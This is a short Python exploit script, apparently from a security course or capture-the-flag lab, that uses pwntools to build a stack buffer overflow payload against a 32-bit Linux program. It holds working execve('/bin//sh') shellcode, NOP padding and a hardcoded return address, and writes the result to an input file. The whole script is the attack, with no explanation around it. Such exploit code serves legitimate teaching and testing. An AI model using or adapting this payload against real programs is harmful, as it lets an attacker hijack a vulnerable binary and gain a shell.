#!/usr/bin/python
# -*- coding: utf-8 -*-
# attack_input2.py
import sys
import struct
from pwn import *

shellcode = b'\x31\xc0' \
     b'\x50' \
     b'\x68\x2f\x2f\x73\x68' \
     b'\x68\x2f\x62\x69\x6e' \
     b'\x89\xe3' \
     b'\x89\xc1' \
     b'\x31\xd2' \
     b'\xb0\x0b' \
     b'\xcd\x80' \

offset = 0x30 # modify it
shell_addr = 0xffffcf3c # modify it with the address of shellcode
## Put the shellcode at the begin
buf = (shellcode) + (offset - len(shellcode) - 4) * b'\x90' + 2 * p32(shell_addr)

file = open('attack_input2', 'wb')
file.write(buf)
file.close()
